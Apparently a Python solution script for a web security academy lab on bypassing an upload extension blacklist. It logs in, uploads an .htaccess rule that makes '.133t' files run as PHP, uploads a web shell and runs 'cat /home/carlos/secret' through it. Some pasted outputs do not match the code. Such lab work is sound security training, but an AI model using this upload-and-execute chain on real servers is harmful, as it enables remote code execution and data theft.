# Lab: Web shell upload via extension blacklist bypass

import requests
from pathlib import Path

cwd = Path(__file__).resolve().parent
webshell = cwd / "web_shell.php"

base = "https://0a1100a0046af1b5804dda3c007200de.web-security-academy.net"
user_session=requests.Session()

print("===========[step1] login with provided Credential===============")
r = user_session.get(f"{base}/login")   # this lab's login form may also carry a csrf token
login_data = {"username": "wiener", "password": "peter"}
if 'name="csrf"' in r.text:
    login_data["csrf"] = r.text.split('name="csrf" value="')[1].split('"')[0]
r = user_session.post(f"{base}/login", data=login_data)
print("login csrf:", login_data["csrf"])
print("status:", r.status_code)
print("body:", r.text)
'''
                        <form class=login-form id=avatar-upload-form action="/my-account/avatar" method=POST enctype="multipart/form-data">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class=avatar>
                            </p>
                            <label>Avatar:</label>
                            <input type=file name=avatar>
                            <input type=hidden name=user value=wiener />
                            <input required type="hidden" name="csrf" value="zvBF2WVpUynZDklmyeybkKAmPIPUyBLO">
                            <button class=button type=submit>Upload</button>
                        </form>
'''
user_info={}
if 'name="csrf"' in r.text:
    user_info["csrf"]=r.text.split('name="csrf" value="')[1].split('"')[0]

data = {"user": "wiener", "csrf": user_info["csrf"]}

print("===========[step2] Upload .htaccess===============")
files = {
    "avatar": (".htaccess", "AddType application/x-httpd-php .133t", "text/plain")
}
r = user_session.post(f"{base}/my-account/avatar", files=files, data=data)
print("status:", r.status_code, "/ body:", r.text)

print("===========[step2-1] Upload Web Shell (.133t)===============")
files = {
    "avatar": ("web_shell.133t", open(webshell, "rb"), "image/jpeg")
}
r = user_session.post(f"{base}/my-account/avatar", files=files, data=data)
print("status:", r.status_code, "/ body:", r.text)

'''
status: 200
body: The file avatars/web_shell.jpg has been uploaded.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>
'''

print("===========[step3] Aceess to my-account again===============")
r = user_session.get(f"{base}/my-account", allow_redirects=False)
print("status:", r.status_code)
print("body:", r.text)
'''
                       <form class=login-form id=avatar-upload-form action="/my-account/avatar" method=POST enctype="multipart/form-data">
                            <p>
                            <img src="/files/avatars/web_shell.php" class=avatar>
                            </p>
                            <label>Avatar:</label>
                            <input type=file name=avatar>
                            <input type=hidden name=user value=wiener />
                            <input required type="hidden" name="csrf" value="31dJhuFw4xtx562tWcmEM1e1QI1zTNgA">
                            <button class=button type=submit>Upload</button>
                        </form>
'''

print("===========[step4] Execute Web Shell===============")
shell_url = f"{base}/files/avatars/web_shell.133t"

r = user_session.get(shell_url, params={"cmd": "cat /home/carlos/secret"})

secret = r.text.strip()
print("secret:", secret)